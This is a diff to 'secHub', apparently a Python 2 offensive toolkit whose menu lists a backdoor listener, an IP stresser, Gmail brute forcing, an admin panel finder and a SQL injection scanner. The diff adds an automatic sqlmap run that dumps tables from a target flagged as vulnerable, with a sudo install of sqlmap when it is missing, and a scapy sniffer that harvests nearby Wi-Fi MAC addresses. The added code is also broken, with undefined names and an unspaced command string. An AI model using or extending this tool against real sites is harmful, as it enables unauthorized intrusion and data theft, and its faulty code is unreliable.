@@ -32,15 +32,19 @@ import os
 import sys
 import socket
 import subprocess
+import struct
 
 from termcolor import colored, cprint
 from datetime import datetime
 from urllib2 import  Request, urlopen, URLError, HTTPError
+from scapy.all import * 
 
 import time
 import hashlib
 import smtplib
 import threading
+import textwrap 
+
 
 __author__ = "Josh"
 __version__ = "1.05"
@@ -48,9 +52,20 @@ __license__ = "GNU GENERAL PUBLIC LICENSE"
 
 DATE = "July 26, 2017"
 NAME = "secHub"
+TOOLS = 9
 
 GIT = "https://github.com/joshDelta/secHub.git"
 WEBSITE_PARTNER = "http://unrealsecurity.net"
+
+TAB_1 = '\t - '
+TAB_2 = '\t\t - '
+TAB_3 = '\t\t\t - '
+TAB_4 = '\t\t\t\t - '
+
+DATA_TAB_1 = '\t '
+DATA_TAB_2 = '\t\t '
+DATA_TAB_3 = '\t\t\t '
+DATA_TAB_4 = '\t\t\t\t '
 
 def secHub():
 	cprint("""
@@ -88,7 +103,16 @@ def PlatformCheck():
 
 PlatformCheck()
 time.sleep(1)
+
+devices = set
+
+def PacketHandler(pkt):
 	
+	if pkt.haslayer(Dot11):
+		if pkt.addr2 and ( pkt.addr2 not in service ):
+		       devices.add(pkt.addr2)
+	       	       print len(devices), pkt.addr2
+
 def sockListen():
 	global host
 	global port
@@ -138,7 +162,6 @@ def sockAccept():
 	except KeyboardInterrupt:
 		print("\n\t[-] User Aborted! ")
 		sys.exit(0)
-
 
 def send_commands(conn):
 	try:
@@ -384,11 +407,11 @@ def adminPanelFinder():
 		finally:
 			f.close() 
 
-				
+			
 def sqlScanner():
 
 	global source
-	
+	global target 
 
 	sql_errors = {
 		"error in your SQL syntax": 'SQL syntax error',
@@ -419,7 +442,7 @@ def sqlScanner():
 
 	vuln = "?id=1"
 
-	target = raw_input(colored("\t(*) Enter Website Target(Full URL): ", 'blue'))
+	target = raw_input(colored("\t(*) Enter Website Target Again: ", 'blue'))
 
 	cprint("\t[*] Starting Scan... ", 'green')
 	start_time = time.time()
@@ -472,17 +495,46 @@ def sqlScanner():
 		if error in source or vuln in target:
 			time.sleep(2)
 			cprint("\n\t[+] Target is Vulnerable to SQL Injection! ", 'magenta')
+			runSQLMap() 
 			return True
 
 		elif vuln not in target and error not in source:
 			cprint("\n\t[-] Target is Not Vulnerable to SQL", 'red')
 			return False
+def runSQLMap():
+
+	try:
+		sqlmap = subprocess.call('sqlmap')
+		sqlmap_boolean = True
+		os.system('clear') 
+		cprint("\n\t[+] SQLMap Found!", 'green')
+		time.sleep(2.5)
+		os.system('sqlmap -u ' + target + '--batch --banner --tables ')
+	
+	except OSError:
+		sqlmap_boolean = False
+		cprint('\n\t[!] SQLMap Not Found! Installing it for you...')
+		time.sleep(1) 
+		os.system('sudo apt install sqlmap')
+		
+		for x in range(1):
+			try:
+				subprocess.call('sqlmap')
+				sqlmap_boolean = True
+			
+			except:
+				pass
+
+	except KeyboardInterrupt:
+		sys.exit(0) 	
+	
+
 		
 def Options():
 
 	cprint("\t1: Listener and Backdoor\n\t2: Scan Network With Nmap\n\t3: Website/IP Stresser\n\t"
 		"4: MD5 Hashing\n\t5: Gmail BruteForce\n\t6: Port Scanner\n\t7: Website Admin Panel Finder\n\t8: SQL Scanner\n\t"
-		"9: Exit" , 'blue')
+		"9: Discover WIFI Devices\n\t10: Exit" , 'blue')
 
 
 	
@@ -559,10 +611,27 @@ def main():
 
 	if start_script_input == '8':
 		os.system('clear')
-		sqlScanner()
+		sqlScanner() 
 
 	if start_script_input == '9':
-		sys.exit(0)
+		os.system('clear') 
+		try:
+			DEVICE = raw_input(colored("\t(*) Enter Networking Device(ie: wlan0, eth0): ", 'blue'))
+
+		except socket.error as w:
+			cprint("\n\t" + str(w), 'red')
+			cprint("\t[!] Retrying...")
+			time.sleep(1)
+			PacketHandler(pkt) 
+
+		except:
+			pass
+
+		sniff(iface = DEVICE, count = 10000, prn = PacketHandler)
+
+
+	elif start_script_input == '10':
+		sys.exit(0) 
 
 
 if __name__ == "__main__":
